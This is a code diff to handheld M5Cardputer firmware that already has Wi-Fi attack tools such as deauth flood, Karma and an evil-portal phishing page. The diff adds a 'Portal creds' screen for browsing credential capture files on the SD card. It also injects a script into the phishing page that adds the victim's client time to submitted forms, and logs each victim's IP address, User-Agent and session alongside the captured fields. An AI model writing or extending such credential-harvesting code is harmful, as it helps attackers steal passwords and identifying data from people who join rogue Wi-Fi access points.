@@ -20,7 +20,7 @@ const char *const MENU_ITEMS[] = {"WiFi", "BLE", "RF 433MHz", "NRF24 2.4GHz", "I
 constexpr int MENU_COUNT = sizeof(MENU_ITEMS) / sizeof(MENU_ITEMS[0]);
 constexpr int WIFI_ITEM = 0;
 
-const char *const WIFI_TOOLS[] = {"Scan networks", "Channel analyzer", "Packet sniffer", "Beacon spam", "Deauth flood", "Karma", "Handshake capture", "Evil portal"};
+const char *const WIFI_TOOLS[] = {"Scan networks", "Channel analyzer", "Packet sniffer", "Beacon spam", "Deauth flood", "Karma", "Handshake capture", "Evil portal", "Portal creds"};
 constexpr int WIFI_TOOL_COUNT = sizeof(WIFI_TOOLS) / sizeof(WIFI_TOOLS[0]);
 constexpr int WIFI_TOOL_SCAN = 0;
 constexpr int WIFI_TOOL_CHANNELS = 1;
@@ -30,6 +30,7 @@ constexpr int WIFI_TOOL_DEAUTH = 4;
 constexpr int WIFI_TOOL_KARMA = 5;
 constexpr int WIFI_TOOL_HANDSHAKE = 6;
 constexpr int WIFI_TOOL_PORTAL = 7;
+constexpr int WIFI_TOOL_CREDS = 8;
 
 constexpr int WIFI_VISIBLE_ROWS = 8;
 constexpr int CH_FIRST = 1;
@@ -38,7 +39,7 @@ constexpr uint32_t CH_DWELL_MS = 300;
 constexpr int BAR_BASE_Y = 108;
 constexpr int BAR_MAX_H = 72;
 
-enum class Screen { Menu, Placeholder, WifiMenu, WifiScan, WifiChannels, WifiSniff, WifiSpamSelect, WifiSpamText, WifiSpamRun, WifiDeauthSelect, WifiDeauthCheck, WifiDeauthRun, WifiKarmaRun, WifiHsRun, WifiPortalRun };
+enum class Screen { Menu, Placeholder, WifiMenu, WifiScan, WifiChannels, WifiSniff, WifiSpamSelect, WifiSpamText, WifiSpamRun, WifiDeauthSelect, WifiDeauthCheck, WifiDeauthRun, WifiKarmaRun, WifiHsRun, WifiPortalRun, WifiCredsFiles, WifiCredsView };
 
 Screen screen = Screen::Menu;
 int selected = 0;
@@ -1591,6 +1592,23 @@ void portalRedirect() {
     portalServer.send(302, "text/plain", "");
 }
 
+uint32_t portalSession = 0;
+const char *const PORTAL_CLIENT_TIME_SCRIPT =
+    "<script>document.addEventListener('submit',function(e){var i=document.createElement('input');"
+    "i.type='hidden';i.name='client_time';i.value=new Date().toString();e.target.appendChild(i);},true);</script>";
+
+String portalWithScript(const String &page) {
+    String out = page;
+    int at = out.indexOf("</body>");
+    if (at < 0) at = out.indexOf("</BODY>");
+    if (at >= 0) {
+        out = out.substring(0, at) + PORTAL_CLIENT_TIME_SCRIPT + out.substring(at);
+    } else {
+        out += PORTAL_CLIENT_TIME_SCRIPT;
+    }
+    return out;
+}
+
 void portalHandleRoot() {
     String host = portalServer.hostHeader();
     if (host.length() && host != WiFi.softAPIP().toString()) {
@@ -1598,7 +1616,7 @@ void portalHandleRoot() {
         return;
     }
     portalViews++;
-    portalServer.send(200, "text/html", portalPage);
+    portalServer.send(200, "text/html", portalWithScript(portalPage));
 }
 
 void portalCredsPath(char *out, size_t n) {
@@ -1617,7 +1635,9 @@ void portalHandlePost() {
         portalRedirect();
         return;
     }
-    String line = String(millis()) + ", ssid: " + deauthSsid;
+    String line = "session: " + String(portalSession) + ", ssid: " + deauthSsid + ", channel: " + String(deauthCh) +
+                  ", uptime_min: " + String(millis() / 60000) + ", client_ip: " +
+                  portalServer.client().remoteIP().toString() + ", user_agent: " + portalServer.header("User-Agent");
     String lastVal = "";
     for (int i = 0; i < portalServer.args(); i++) {
         String key = portalServer.argName(i);
@@ -1683,6 +1703,8 @@ void startPortal() {
         portalServer.on("/", HTTP_GET, portalHandleRoot);
         portalServer.on("/post", HTTP_POST, portalHandlePost);
         portalServer.onNotFound(portalRedirect);
+        const char *portalHeaderKeys[] = {"User-Agent"};
+        portalServer.collectHeaders(portalHeaderKeys, 1);
         portalRoutesAdded = true;
     }
     portalDns.start(53, "*", WiFi.softAPIP());
@@ -1691,6 +1713,7 @@ void startPortal() {
     portalCaptured = 0;
     portalLast[0] = '\0';
     portalCredsName[0] = '\0';
+    portalSession++;
     portalRunning = true;
     portalLastDraw = 0;
 }
@@ -1711,6 +1734,119 @@ void tickPortal() {
         portalLastDraw = now;
         drawPortal();
     }
+}
+
+constexpr int CREDS_FILES_MAX = 12;
+constexpr int CREDS_ENTRIES_MAX = 60;
+constexpr int CREDS_WRAP = 38;
+char credsFileNames[CREDS_FILES_MAX][40];
+int credsFileCount = 0;
+int credsFileSel = 0;
+String credsEntries[CREDS_ENTRIES_MAX];
+int credsEntryCount = 0;
+int credsEntrySel = 0;
+String credsStatus = "";
+
+void scanCredsFiles() {
+    credsFileCount = 0;
+    credsFileSel = 0;
+    credsStatus = "";
+    if (!ensureSd()) {
+        credsStatus = "no SD card found";
+        return;
+    }
+    if (!SD.exists(PORTAL_CREDS_DIR)) {
+        credsStatus = "no captures yet";
+        return;
+    }
+    File dir = SD.open(PORTAL_CREDS_DIR);
+    File f = dir.openNextFile();
+    while (f && credsFileCount < CREDS_FILES_MAX) {
+        if (!f.isDirectory()) {
+            String name = String(f.name());
+            int slash = name.lastIndexOf('/');
+            if (slash >= 0) name = name.substring(slash + 1);
+            if (name.endsWith(".csv")) {
+                snprintf(credsFileNames[credsFileCount], sizeof(credsFileNames[0]), "%s", name.c_str());
+                credsFileCount++;
+            }
+        }
+        f.close();
+        f = dir.openNextFile();
+    }
+    dir.close();
+    if (credsFileCount == 0) credsStatus = "no captures yet";
+}
+
+void openCredsFile(int idx) {
+    char path[80];
+    snprintf(path, sizeof(path), "%s/%s", PORTAL_CREDS_DIR, credsFileNames[idx]);
+    credsEntryCount = 0;
+    File f = SD.open(path, FILE_READ);
+    if (!f) {
+        credsStatus = "could not open file";
+        return;
+    }
+    while (f.available() && credsEntryCount < CREDS_ENTRIES_MAX) {
+        String line = f.readStringUntil('\n');
+        line.trim();
+        if (line.length() == 0) continue;
+        credsEntries[credsEntryCount++] = line;
+    }
+    f.close();
+    credsEntrySel = credsEntryCount > 0 ? credsEntryCount - 1 : 0;
+}
+
+void drawCredsFiles() {
+    auto &d = M5Cardputer.Display;
+    d.fillScreen(COLOR_BG);
+    d.setTextSize(1);
+    d.setTextColor(COLOR_PRIMARY, COLOR_BG);
+    char header[40];
+    snprintf(header, sizeof(header), "Captured creds: %d files", credsFileCount);
+    d.drawString(header, 4, 4);
+    if (credsStatus.length() > 0) {
+        d.drawString(credsStatus.c_str(), 4, 20);
+    }
+    for (int i = 0; i < credsFileCount && i < 9; i++) {
+        int y = 20 + i * 11;
+        if (i == credsFileSel) {
+            d.fillRect(0, y - 1, d.width(), 10, COLOR_PRIMARY);
+            d.setTextColor(COLOR_BG, COLOR_PRIMARY);
+        } else {
+            d.setTextColor(COLOR_PRIMARY, COLOR_BG);
+        }
+        d.drawString(credsFileNames[i], 4, y);
+    }
+    d.setTextColor(COLOR_SECONDARY, COLOR_BG);
+    d.drawString("Enter open  Bksp back", 4, 124);
+}
+
+void drawCredsView() {
+    auto &d = M5Cardputer.Display;
+    d.fillScreen(COLOR_BG);
+    d.setTextSize(1);
+    d.setTextColor(COLOR_PRIMARY, COLOR_BG);
+    char header[48];
+    if (credsEntryCount == 0) {
+        snprintf(header, sizeof(header), "No entries in file");
+        d.drawString(header, 4, 4);
+    } else {
+        snprintf(header, sizeof(header), "Entry %d/%d", credsEntrySel + 1, credsEntryCount);
+        d.drawString(header, 4, 4);
+        const String &e = credsEntries[credsEntrySel];
+        int y = 16;
+        int row = 0;
+        for (int pos = 0; pos < static_cast<int>(e.length()) && row < 9; pos += CREDS_WRAP, row++) {
+            int n = e.length() - pos;
+            if (n > CREDS_WRAP) n = CREDS_WRAP;
+            String part = e.substring(pos, pos + n);
+            d.drawString(part.c_str(), 4, y);
+            y += 11;
+        }
+    }
+    d.setTextColor(COLOR_SECONDARY, COLOR_BG);
+    d.drawString("; prev  . next  Bksp files", 4, 124);
 }
 
 bool wordHas(const std::vector<char> &word, char c) {
@@ -1814,6 +1950,10 @@ void loop() {
                 screen = Screen::WifiDeauthSelect;
                 listPurpose = PURPOSE_HANDSHAKE;
                 enterScanList();
+            } else if (wifiToolSel == WIFI_TOOL_CREDS) {
+                screen = Screen::WifiCredsFiles;
+                scanCredsFiles();
+                drawCredsFiles();
             } else if (wifiToolSel == WIFI_TOOL_PORTAL) {
                 screen = Screen::WifiDeauthSelect;
                 listPurpose = PURPOSE_PORTAL;
@@ -2073,6 +2213,36 @@ void loop() {
                 startPortal();
             }
             drawPortal();
+        }
+        break;
+
+    case Screen::WifiCredsFiles:
+        if (back) {
+            screen = Screen::WifiMenu;
+            drawWifiMenu();
+        } else if (up) {
+            if (credsFileSel > 0) credsFileSel--;
+            drawCredsFiles();
+        } else if (down) {
+            if (credsFileSel < credsFileCount - 1) credsFileSel++;
+            drawCredsFiles();
+        } else if (ks.enter && credsFileCount > 0) {
+            openCredsFile(credsFileSel);
+            screen = Screen::WifiCredsView;
+            drawCredsView();
+        }
+        break;
+
+    case Screen::WifiCredsView:
+        if (back) {
+            screen = Screen::WifiCredsFiles;
+            drawCredsFiles();
+        } else if (up) {
+            if (credsEntrySel > 0) credsEntrySel--;
+            drawCredsView();
+        } else if (down) {
+            if (credsEntrySel < credsEntryCount - 1) credsEntrySel++;
+            drawCredsView();
         }
         break;
     }
